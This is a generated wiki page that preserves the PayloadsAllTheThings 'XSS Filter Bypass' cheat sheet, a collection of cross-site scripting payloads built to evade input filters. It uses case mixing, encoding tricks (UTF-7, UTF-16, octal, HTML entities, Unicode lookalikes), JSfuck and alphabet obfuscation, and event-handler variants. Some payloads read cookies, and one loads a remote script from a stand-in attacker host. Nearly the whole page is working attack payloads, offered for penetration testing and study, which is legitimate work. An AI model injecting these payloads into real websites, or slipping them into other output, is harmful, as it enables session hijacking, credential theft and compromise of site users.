---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# XSS Filter Bypass

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-xss-injection-1-xss-filter-bypass` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/1 - XSS Filter Bypass.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [XSS Filter Bypass](../../topics/xss-injection/xss-filter-bypass.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-xss-injection-1-xss-filter-bypass |
| name | XSS Filter Bypass |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/1%20-%20XSS%20Filter%20Bypass.md |

## Preserved Source Material

````yaml
_body: "# XSS Filter Bypass\n\n## Summary\n\n- [Bypass Case Sensitive](#bypass-case-sensitive)\n- [Bypass Tag Blacklist](#bypass-tag-blacklist)\n\
  - [Bypass Word Blacklist with Code Evaluation](#bypass-word-blacklist-with-code-evaluation)\n- [Bypass with Incomplete HTML\
  \ Tag](#bypass-with-incomplete-html-tag)\n- [Bypass Quotes for String](#bypass-quotes-for-string)\n- [Bypass Quotes in Script\
  \ Tag](#bypass-quotes-in-script-tag)\n- [Bypass Quotes in Mousedown Event](#bypass-quotes-in-mousedown-event)\n- [Bypass\
  \ Dot Filter](#bypass-dot-filter)\n- [Bypass Parenthesis for String](#bypass-parenthesis-for-string)\n- [Bypass Parenthesis\
  \ and Semi Colon](#bypass-parenthesis-and-semi-colon)\n- [Bypass onxxxx= Blacklist](#bypass-onxxxx-blacklist)\n- [Bypass\
  \ Space Filter](#bypass-space-filter)\n- [Bypass Email Filter](#bypass-email-filter)\n- [Bypass Tel URI Filter](#bypass-tel-uri-filter)\n\
  - [Bypass document Blacklist](#bypass-document-blacklist)\n- [Bypass document.cookie Blacklist](#bypass-documentcookie-blacklist)\n\
  - [Bypass using Javascript Inside a String](#bypass-using-javascript-inside-a-string)\n- [Bypass using an Alternate Way\
  \ to Redirect](#bypass-using-an-alternate-way-to-redirect)\n- [Bypass using an Alternate Way to Execute an Alert](#bypass-using-an-alternate-way-to-execute-an-alert)\n\
  - [Bypass \">\" using Nothing](#bypass--using-nothing)\n- [Bypass \"<\" and \">\" using ＜ and ＞](#bypass--and--using--and-)\n\
  - [Bypass \";\" using Another Character](#bypass--using-another-character)\n- [Bypass using Missing Charset Header](#bypass-using-missing-charset-header)\n\
  - [Bypass using HTML encoding](#bypass-using-html-encoding)\n- [Bypass using Katakana](#bypass-using-katakana)\n- [Bypass\
  \ using Cuneiform](#bypass-using-cuneiform)\n- [Bypass using Lontara](#bypass-using-lontara)\n- [Bypass using ECMAScript6](#bypass-using-ecmascript6)\n\
  - [Bypass using Octal encoding](#bypass-using-octal-encoding)\n- [Bypass using Unicode](#bypass-using-unicode)\n- [Bypass\
  \ using UTF-7](#bypass-using-utf-7)\n- [Bypass using UTF-8](#bypass-using-utf-8)\n- [Bypass using UTF-16be](#bypass-using-utf-16be)\n\
  - [Bypass using UTF-32](#bypass-using-utf-32)\n- [Bypass using BOM](#bypass-using-bom)\n- [Bypass using JSfuck](#bypass-using-jsfuck)\n\
  - [References](#references)\n\n## Bypass Case Sensitive\n\nTo bypass a case-sensitive XSS filter, you can try mixing uppercase\
  \ and lowercase letters within the tags or function names.\n\n```javascript\n<sCrIpt>alert(1)</ScRipt>\n<ScrIPt>alert(1)</ScRipT>\n\
  ```\n\nSince many XSS filters only recognize exact lowercase or uppercase patterns, this can sometimes evade detection by\
  \ tricking simple case-sensitive filters.\n\n## Bypass Tag Blacklist\n\n```javascript\n<script x>\n<script x>alert('XSS')<script\
  \ y>\n```\n\n## Bypass Word Blacklist with Code Evaluation\n\n```javascript\neval('ale'+'rt(0)');\nFunction(\"ale\"+\"rt(1)\"\
  )();\nnew Function`al\\ert\\`6\\``;\nsetTimeout('ale'+'rt(2)');\nsetInterval('ale'+'rt(10)');\nSet.constructor('ale'+'rt(13)')();\n\
  Set.constructor`al\\x65rt\\x2814\\x29```;\n```\n\n## Bypass with Incomplete HTML Tag\n\nWorks on IE/Firefox/Chrome/Safari\n\
  \n```javascript\n<img src='1' onerror='alert(0)' <\n```\n\n## Bypass Quotes for String\n\n```javascript\nString.fromCharCode(88,83,83)\n\
  ```\n\n## Bypass Quotes in Script Tag\n\n```javascript\nhttp://localhost/bla.php?test=</script><script>alert(1)</script>\n\
  <html>\n  <script>\n    <?php echo 'foo=\"text '.$_GET['test'].'\";';`?>\n  </script>\n</html>\n```\n\n## Bypass Quotes\
  \ in Mousedown Event\n\nYou can bypass a single quote with &#39; in an on mousedown event handler\n\n```javascript\n<a href=\"\
  \" onmousedown=\"var name = '&#39;;alert(1)//'; alert('smthg')\">Link</a>\n```\n\n## Bypass Dot Filter\n\n```javascript\n\
  <script>window['alert'](document['domain'])</script>\n```\n\nConvert IP address into decimal format: IE. `http://192.168.1.1`\
  \ == `http://3232235777`\n\n```javascript\n<script>eval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))<script>\n```\n\nBase64\
  \ encoding your XSS payload with Linux command: IE. `echo -n \"alert(document.cookie)\" | base64` == `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==`\n\
  \n## Bypass Parenthesis for String\n\n```javascript\nalert`1`\nsetTimeout`alert\\u0028document.domain\\u0029`;\n```\n\n\
  ## Bypass Parenthesis and Semi Colon\n\n- From @garethheyes\n\n    ```javascript\n    <script>onerror=alert;throw 1337</script>\n\
  \    <script>{onerror=alert}throw 1337</script>\n    <script>throw onerror=alert,'some string',123,'haha'</script>\n   \
  \ ```\n\n- From @terjanq\n\n    ```js\n    <script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>\n\
  \    ```\n\n- From @cgvwzq\n\n    ```js\n    <script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>\n\
  \    ```\n\n## Bypass onxxxx Blacklist\n\n- Use less known tag\n\n    ```html\n    <object onafterscriptexecute=confirm(0)>\n\
  \    <object onbeforescriptexecute=confirm(0)>\n    ```\n\n- Bypass onxxx= filter with a null byte/vertical tab/Carriage\
  \ Return/Line Feed\n\n    ```html\n    <img src='1' onerror\\x00=alert(0) />\n    <img src='1' onerror\\x0b=alert(0) />\n\
  \    <img src='1' onerror\\x0d=alert(0) />\n    <img src='1' onerror\\x0a=alert(0) />\n    ```\n\n- Bypass onxxx= filter\
  \ with a '/'\n\n    ```js\n    <img src='1' onerror/=alert(0) />\n    ```\n\n## Bypass Space Filter\n\n- Bypass space filter\
  \ with \"/\"\n\n    ```javascript\n    <img/src='1'/onerror=alert(0)>\n    ```\n\n- Bypass space filter with `0x0c/^L` or\
  \ `0x0d/^M` or `0x0a/^J` or `0x09/^I`\n\n  ```html\n  <svg\fonload\f=\falert(1)\f>\n  ```\n\n```ps1\n$ echo \"<svg^Lonload^L=^Lalert(1)^L>\"\
  \ | xxd\n00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al\n00000010: 6572 7428 3129 0c3e 0a         \
  \          ert(1).>.\n```\n\n## Bypass Email Filter\n\n- [RFC0822 compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate)\n\
  \n  ```javascript\n  \"><svg/onload=confirm(1)>\"@x.y\n  ```\n\n- [RFC5322 compliant](https://0dave.ch/posts/rfc5322-fun/)\n\
  \n  ```javascript\n  xss@example.com(<img src='x' onerror='alert(document.location)'>)\n  ```\n\n## Bypass Tel URI Filter\n\
  \nAt least 2 RFC mention the `;phone-context=` descriptor:\n\n- [RFC3966 - The tel URI for Telephone Numbers](https://www.ietf.org/rfc/rfc3966.txt)\n\
  - [RFC2806 - URLs for Telephone Calls](https://www.ietf.org/rfc/rfc2806.txt)\n\n```javascript\n+330011223344;phone-context=<script>alert(0)</script>\n\
  ```\n\n## Bypass Document Blacklist\n\n```javascript\n<div id = \"x\"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>\n\
  window[\"doc\"+\"ument\"]\n```\n\n## Bypass document.cookie Blacklist\n\nThis is another way to access cookies on Chrome,\
  \ Edge, and Opera. Replace COOKIE NAME with the cookie you are after. You may also investigate the getAll() method if that\
  \ suits your requirements.\n\n```js\nwindow.cookieStore.get('COOKIE NAME').then((cookieValue)=>{alert(cookieValue.value);});\n\
  ```\n\n## Bypass using Javascript Inside a String\n\n```javascript\n<script>\nfoo=\"text </script><script>alert(1)</script>\"\
  ;\n</script>\n```\n\n## Bypass using an Alternate Way to Redirect\n\n```javascript\nlocation=\"http://google.com\"\ndocument.location\
  \ = \"http://google.com\"\ndocument.location.href=\"http://google.com\"\nwindow.location.assign(\"http://google.com\")\n\
  window['location']['href']=\"http://google.com\"\n```\n\n## Bypass using an Alternate Way to Execute an Alert\n\nFrom [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040)\
  \ tweet.\n\n```javascript\nwindow['alert'](0)\nparent['alert'](1)\nself['alert'](2)\ntop['alert'](3)\nthis['alert'](4)\n\
  frames['alert'](5)\ncontent['alert'](6)\n\n[7].map(alert)\n[8].find(alert)\n[9].every(alert)\n[10].filter(alert)\n[11].findIndex(alert)\n\
  [12].forEach(alert);\n```\n\nFrom [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)\
  \ - Using global variables\n\nThe Object.keys() method returns an array of a given object's own property names, in the same\
  \ order as we get with a normal loop. That's means that we can access any JavaScript function by using its **index number\
  \ instead the function name**.\n\n```javascript\nc=0; for(i in self) { if(i == \"alert\") { console.log(c); } c++; }\n//\
  \ 5\n```\n\nThen calling alert is :\n\n```javascript\nObject.keys(self)[5]\n// \"alert\"\nself[Object.keys(self)[5]](\"\
  1\") // alert(\"1\")\n```\n\nWe can find \"alert\" with a regular expression like ^a[rel]+t$ :\n\n```javascript\n//bind\
  \ function alert on new function a()\na=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} \n\n// then you\
  \ can use a() with Object.keys\nself[Object.keys(self)[a()]](\"1\") // alert(\"1\")\n```\n\nOneliner:\n\n```javascript\n\
  a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](\"1\")\n```\n\nFrom [@quanyang](https://twitter.com/quanyang/status/1078536601184030721)\
  \ tweet.\n\n```javascript\nprompt`${document.domain}`\ndocument.location='java\\tscript:alert(1)'\ndocument.location='java\\\
  rscript:alert(1)'\ndocument.location='java\\tscript:alert(1)'\n```\n\nFrom [@404death](https://twitter.com/404death/status/1011860096685502464)\
  \ tweet.\n\n```javascript\neval('ale'+'rt(0)');\nFunction(\"ale\"+\"rt(1)\")();\nnew Function`al\\ert\\`6\\``;\n\nconstructor.constructor(\"\
  aler\"+\"t(3)\")();\n[].filter.constructor('ale'+'rt(4)')();\n\ntop[\"al\"+\"ert\"](5);\ntop[8680439..toString(30)](7);\n\
  top[/al/.source+/ert/.source](8);\ntop['al\\x65rt'](9);\n\nopen('java'+'script:ale'+'rt(11)');\nlocation='javascript:ale'+'rt(12)';\n\
  \nsetTimeout`alert\\u0028document.domain\\u0029`;\nsetTimeout('ale'+'rt(2)');\nsetInterval('ale'+'rt(10)');\nSet.constructor('ale'+'rt(13)')();\n\
  Set.constructor`al\\x65rt\\x2814\\x29```;\n```\n\nBypass using an alternate way to trigger an alert\n\n```javascript\nvar\
  \ i = document.createElement(\"iframe\");\ni.onload = function(){\n  i.contentWindow.alert(1);\n}\ndocument.appendChild(i);\n\
  \n// Bypassed security\nXSSObject.proxy = function (obj, name, report_function_name, exec_original) {\n      var proxy =\
  \ obj[name];\n      obj[name] = function () {\n        if (exec_original) {\n          return proxy.apply(this, arguments);\n\
  \        }\n      };\n      XSSObject.lockdown(obj, name);\n  };\nXSSObject.proxy(window, 'alert', 'window.alert', false);\n\
  ```\n\n## Bypass \">\" using Nothing\n\nThere is no need to close the tags, the browser will try to fix it.\n\n```javascript\n\
  <svg onload=alert(1)//\n```\n\n## Bypass \"<\" and \">\" using ＜ and ＞\n\nUse Unicode characters `U+FF1C` and `U+FF1E`,\
  \ refer to [Bypass using Unicode](#bypass-using-unicode) for more.\n\n```javascript\n＜script/src=//evil.site/poc.js＞\n```\n\
  \n## Bypass \";\" using Another Character\n\n```javascript\n'te' * alert('*') * 'xt';\n'te' / alert('/') / 'xt';\n'te' %\
  \ alert('%') % 'xt';\n'te' - alert('-') - 'xt';\n'te' + alert('+') + 'xt';\n'te' ^ alert('^') ^ 'xt';\n'te' > alert('>')\
  \ > 'xt';\n'te' < alert('<') < 'xt';\n'te' == alert('==') == 'xt';\n'te' & alert('&') & 'xt';\n'te' , alert(',') , 'xt';\n\
  'te' | alert('|') | 'xt';\n'te' ? alert('ifelsesh') : 'xt';\n'te' in alert('in') in 'xt';\n'te' instanceof alert('instanceof')\
  \ instanceof 'xt';\n```\n\n## Bypass using Missing Charset Header\n\n**Requirements**:\n\n- Server header missing `charset`:\
  \ `Content-Type: text/html`\n\n### ISO-2022-JP\n\nISO-2022-JP uses escape characters to switch between several character\
  \ sets.\n\n| Escape    | Encoding        |\n|-----------|-----------------|\n| `\\x1B (B` | ASCII           |\n| `\\x1B\
  \ (J` | JIS X 0201 1976 |\n| `\\x1B $@` | JIS X 0208 1978 |\n| `\\x1B $B` | JIS X 0208 1983 |\n\nUsing the [code table](https://en.wikipedia.org/wiki/JIS_X_0201#Codepage_layout),\
  \ we can find multiple characters that will be transformed when switching from **ASCII** to **JIS X 0201 1976**.\n\n| Hex\
  \  | ASCII | JIS X 0201 1976 |\n| ---- | --- | --- |\n| 0x5c | `\\` | `¥` |\n| 0x7e | `~` | `‾` |\n\n**Example**:\n\nUse\
  \ `%1b(J` to force convert a `\\'` (ascii) in to `¥'` (JIS X 0201 1976), unescaping the quote.\n\nPayload: `search=%1b(J&lang=en\"\
  ;alert(1)//`\n\n## Bypass using HTML Encoding\n\n```javascript\n%26%2397;lert(1)\n&#97;&#108;&#101;&#114;&#116;\n></script><svg\
  \ onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>\n```\n\n## Bypass using Katakana\n\
  \nUsing the [aemkei/Katakana](https://github.com/aemkei/katakana.js) library.\n\n```javascript\njavascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()\n\
  ```\n\n## Bypass using Cuneiform\n\n```javascript\n\U00012000='',\U0001227A=!\U00012000+\U00012000,\U00012003=!\U0001227A\
  +\U00012000,\U000121FA=\U00012000+{},\U00012310=\U0001227A[\U00012000++],\n\U0001201F=\U0001227A[\U0001222B=\U00012000],\U00012006\
  =++\U0001222B+\U00012000,\U00012079=\U000121FA[\U0001222B+\U00012006],\U0001227A[\U00012079+=\U000121FA[\U00012000]\n+(\U0001227A\
  .\U00012003+\U000121FA)[\U00012000]+\U00012003[\U00012006]+\U00012310+\U0001201F+\U0001227A[\U0001222B]+\U00012079+\U00012310\
  +\U000121FA[\U00012000]\n+\U0001201F][\U00012079](\U00012003[\U00012000]+\U00012003[\U0001222B]+\U0001227A[\U00012006]+\U0001201F\
  +\U00012310+\"(\U00012000)\")()\n```\n\n## Bypass using Lontara\n\n```javascript\nᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+\"\
  (ᨆ)\")()\n```\n\nMore alphabets on [aem1k.com/aurebesh.js](http://aem1k.com/aurebesh.js/)\n\n## Bypass using ECMAScript6\n\
  \n```html\n<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>\n```\n\n## Bypass using Octal encoding\n\n```javascript\n\
  javascript:'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76'\n```\n\n\
  ## Bypass using Unicode\n\nThis payload takes advantage of Unicode escape sequences to obscure the JavaScript function\n\
  \n```html\n<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>\n```\n\nIt uses Unicode escape sequences to represent\
  \ characters.\n\n| Unicode  | ASCII     |\n| -------- | --------- |\n| `\\u0061` | a         |\n| `\\u006C` | l        \
  \ |\n| `\\u0065` | e         |\n| `\\u0072` | r         |\n| `\\u0074` | t         |\n\nSame thing with these Unicode characters.\n\
  \n| Unicode (UTF-8 encoded) | Unicode Name                 | ASCII | ASCII Name     |\n| ----------------------- | ----------------------------\
  \ | ----- | ---------------|\n| `\\uFF1C` (%EF%BC%9C)    | FULLWIDTH LESS­THAN SIGN      | <     | LESS­THAN       |\n|\
  \ `\\uFF1E` (%EF%BC%9E)    | FULLWIDTH GREATER­THAN SIGN   | >     | GREATER­THAN    |\n| `\\u02BA` (%CA%BA)       | MODIFIER\
  \ LETTER DOUBLE PRIME | \"     | QUOTATION MARK |\n| `\\u02B9` (%CA%B9)       | MODIFIER LETTER PRIME        | '     | APOSTROPHE\
  \     |\n\nAn example payload could be `ʺ＞＜svg onload=alert(/XSS/)＞/`, which would look like that after being URL encoded:\n\
  \n```javascript\n%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/\n```\n\nWhen Unicode characters are converted\
  \ to another case, they might bypass a filter look for specific keywords.\n\n| Unicode  | Transform | Character |\n| --------\
  \ | --------- | --------- |\n| `İ` (%c4%b0) | `toLowerCase()` | i |\n| `ı` (%c4%b1) | `toUpperCase()` | I |\n| `ſ` (%c5%bf)\
  \ | `toUpperCase()` | S |\n| `K` (%E2%84) | `toLowerCase()` | k |\n\nThe following payloads become valid HTML tags after\
  \ being converted.\n\n```html\n<ſvg onload=... >\n<ıframe id=x onload=>\n```\n\n## Bypass using UTF-7\n\n```javascript\n\
  +ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-\n```\n\n## Bypass using UTF-8\n\n```javascript\n< = %C0%BC =\
  \ %E0%80%BC = %F0%80%80%BC\n> = %C0%BE = %E0%80%BE = %F0%80%80%BE\n' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7\n\" = %C0%A2 =\
  \ %E0%80%A2 = %F0%80%80%A2\n\" = %CA%BA\n' = %CA%B9\n```\n\n## Bypass using UTF-16be\n\n```javascript\n%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00\n\
  \\x00<\\x00s\\x00v\\x00g\\x00/\\x00o\\x00n\\x00l\\x00o\\x00a\\x00d\\x00=\\x00a\\x00l\\x00e\\x00r\\x00t\\x00(\\x00)\\x00>\n\
  ```\n\n## Bypass using UTF-32\n\n```js\n%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E\n\
  ```\n\n## Bypass using BOM\n\nByte Order Mark (The page must begin with the BOM character.)\nBOM character allows you to\
  \ override charset of the page\n\n```js\nBOM Character for UTF-16 Encoding:\nBig Endian : 0xFE 0xFF\nLittle Endian : 0xFF\
  \ 0xFE\nXSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E\n\nBOM Character\
  \ for UTF-32 Encoding:\nBig Endian : 0x00 0x00 0xFE 0xFF\nLittle Endian : 0xFF 0xFE 0x00 0x00\nXSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E\n\
  ```\n\n## Bypass using JSfuck\n\nBypass using [jsfuck](http://www.jsfuck.com/)\n\n```javascript\n[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()\n\
  ```\n\n## References\n\n- [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities\
  \ - Brett Buerhaus (@bbuerhaus) - March 8, 2017](https://web.archive.org/web/20170330144550/https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)"
_relative_path: XSS Injection/1 - XSS Filter Bypass.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/XSS Injection/1 - XSS Filter Bypass.md
````
